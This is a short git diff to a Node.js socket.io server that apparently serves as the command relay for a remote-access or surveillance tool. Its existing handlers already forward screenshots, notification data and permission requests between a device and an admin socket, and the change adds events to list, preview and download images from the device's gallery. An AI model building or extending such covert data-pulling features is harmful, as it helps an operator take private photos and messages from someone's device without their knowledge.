@@ -59,11 +59,17 @@ io.on('connection', (socket) => {
     socket.on('screenshotResult',(data)=>response("screenshotResult",data));
     socket.on('getNotifications',(data)=>response("getNotifications",data));
     socket.on('notificationData',(data)=>response("notificationData",data));
-    
-    // Permission Events
     socket.on('getPermissionsStatus',(data)=>response("getPermissionsStatus",data));
     socket.on('requestPermissions',(data)=>response("requestPermissions",data));
     socket.on('permissionsStatus',(data)=>response("permissionsStatus",data));
+    
+    // Gallery Events
+    socket.on('getGalleryImages',(data)=>response("getGalleryImages",data));
+    socket.on('getImagePreview',(data)=>response("getImagePreview",data));
+    socket.on('downloadImage',(data)=>response("downloadImage",data));
+    socket.on('galleryImages',(data)=>response("galleryImages",data));
+    socket.on('galleryPreview',(data)=>response("galleryPreview",data));
+    socket.on('galleryDownload',(data)=>response("galleryDownload",data));
 
     socket.on('disconnect', () => {
         if(socket.id===adminSocketId){ adminSocketId=null }
